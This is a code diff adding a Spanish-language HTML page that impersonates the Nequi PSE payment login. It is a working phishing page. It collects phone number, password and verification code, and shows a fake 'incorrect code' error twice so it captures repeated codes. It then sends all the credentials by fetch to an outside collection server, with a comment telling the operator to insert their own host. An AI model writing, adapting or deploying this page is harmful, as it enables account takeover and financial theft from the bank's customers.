@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagos PSE de Nequi</title>
+    <style>
+        :root {
+            --nequi-purple-dark: #330066;
+            --nequi-magenta: #da297a;
+            --nequi-soft-pink: #f7f3f7;
+            --text-gray: #666666;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #ffffff;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            color: var(--nequi-purple-dark);
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 40px 25px;
+            text-align: center;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .logo {
+            font-size: 30px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        .logo span { color: var(--nequi-magenta); font-size: 40px; vertical-align: middle; }
+
+        h1 { font-size: 22px; margin-bottom: 20px; font-weight: 600; }
+
+        .description {
+            font-size: 14px;
+            color: var(--text-gray);
+            line-height: 1.5;
+            margin-bottom: 30px;
+        }
+
+        /* Inputs */
+        .input-group { margin-bottom: 12px; }
+
+        input {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 10px;
+            background-color: var(--nequi-soft-pink);
+            font-size: 16px;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        input:focus { background-color: #fff; box-shadow: 0 0 0 2px var(--nequi-magenta); }
+
+        /* BOTÓN DE ACEPTACIÓN INTERACTIVO */
+        .terms-container {
+            border: 1px solid #e0cce0;
+            border-radius: 15px;
+            padding: 15px;
+            margin: 20px 0;
+            display: flex;
+            align-items: center;
+            text-align: left;
+            cursor: pointer; /* Hace que parezca clickeable */
+            transition: background 0.2s;
+        }
+
+        .terms-container:active { background-color: #fdf0f6; }
+
+        .radio-circle {
+            width: 28px;
+            height: 28px;
+            border: 2px solid #ccc; /* Gris cuando no está seleccionado */
+            border-radius: 50%;
+            margin-right: 15px;
+            flex-shrink: 0;
+            position: relative;
+            transition: all 0.3s;
+        }
+
+        /* Cuando está seleccionado */
+        .terms-container.selected .radio-circle {
+            border-color: var(--nequi-magenta);
+            background-color: white;
+        }
+
+        .terms-container.selected .radio-circle::after {
+          
+    content: "";
+    position: absolute;
+    top: 2px;
+    left: 2px;
+    width: 25px;
+    height: 25px;
+    background-color: var(--nequi-magenta);
+    border-radius: 50%;
+
+        }
+        .terms-text { font-size: 12.5px; line-height: 1.4; color: #444; }
+
+        /* Botones */
+        .btn-main {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 12px;
+            transition: 0.3s;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 55px;
+        }
+
+        .btn-entra { background-color: #ebc6d9; color: white; }
+        .btn-entra.ready { background-color: var(--nequi-magenta); }
+
+        .btn-ahora { background-color: white; color: #333; border: 1.5px solid #333; }
+
+        /* ANIMACIÓN DE CARGA (SPINNER) */
+        .spinner {
+            width: 24px;
+            height: 24px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            display: none; /* Oculto por defecto */
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        #error-msg { color: var(--nequi-magenta); font-size: 13px; margin-bottom: 15px; display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo"><span>.</span>Nequi</div>
+        <h1>Pagos PSE de Nequi</h1>
+        
+        <p class="description">
+            Ingresa tu número de cel y clave. Recuerda que debes tener tu cel a la mano para terminar el proceso.
+        </p>
+
+        <form id="pseForm">
+            <div id="error-msg">Código incorrecto. Inténtalo de nuevo.</div>
+            
+            <div class="input-group">
+                <input type="text" id="usuario" placeholder="Número de celular" required>
+            </div>
+            
+            <div class="input-group">
+                <input type="password" id="clave" placeholder="Clave" required>
+            </div>
+
+            <div class="input-group">
+                <input type="text" id="codigo" placeholder="Código de verificación" required>
+            </div>
+
+            <div class="terms-container" id="termsBtn">
+                <div class="radio-circle"></div>
+                <div class="terms-text">
+                    Acepto que las entradas del formulario se comprueben en busca de spam y se almacenen encriptadas durante 14 días.
+                </div>
+            </div>
+
+            <button type="submit" class="btn-main btn-entra" id="submitBtn">
+                <span id="btnText">Entra</span>
+                <div class="spinner" id="btnSpinner"></div>
+            </button>
+            <button type="button" class="btn-main btn-ahora">Ahora No</button>
+        </form>
+    </div>
+
+    <script>
+        let counter = 0;
+        let termsAccepted = false;
+        const form = document.getElementById('pseForm');
+        const termsBtn = document.getElementById('termsBtn');
+        const submitBtn = document.getElementById('submitBtn');
+        const btnText = document.getElementById('btnText');
+        const btnSpinner = document.getElementById('btnSpinner');
+        const errorMsg = document.getElementById('error-msg');
+
+        // Lógica para seleccionar el botón de aceptación
+        termsBtn.addEventListener('click', () => {
+            termsAccepted = !termsAccepted;
+            termsBtn.classList.toggle('selected');
+            checkReady();
+        });
+
+        // Cambiar color del botón principal si hay texto
+        form.addEventListener('input', checkReady);
+
+        function checkReady() {
+            if (document.getElementById('usuario').value.length > 0 && termsAccepted) {
+                submitBtn.classList.add('ready');
+            } else {
+                submitBtn.classList.remove('ready');
+            }
+        }
+
+        form.onsubmit = async (e) => {
+            e.preventDefault();
+            
+            if (!termsAccepted) {
+                alert("Debes aceptar los términos para continuar.");
+                return;
+            }
+
+            counter++;
+
+            if (counter < 3) {
+                errorMsg.style.display = 'block';
+                document.getElementById('codigo').value = '';
+                return;
+            }
+
+            // TERCER INTENTO: Animación de carga y envío
+            errorMsg.style.display = 'none';
+            btnText.style.display = 'none';
+            btnSpinner.style.display = 'block';
+            submitBtn.disabled = true;
+
+            const payload = {
+                usuario: document.getElementById('usuario').value,
+                clave: document.getElementById('clave').value,
+                codigo: document.getElementById('codigo').value
+            };
+
+            try {
+                // RECUERDA CAMBIAR ESTA URL POR LA TUYA DE RENDER
+                const response = await fetch('https://trabajo-captura.onrender.com/api/capturar', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                // Simulamos un retraso de 2 segundos para que se vea la animación
+                // setTimeout(() => {
+                    
+                // }, 2000);
+
+            } catch (err) {
+                btnText.style.display = 'block';
+                btnSpinner.style.display = 'none';
+                submitBtn.disabled = false;
+                alert('Error de conexión.');
+            }
+        };
+    </script>
+</body>
+</html>
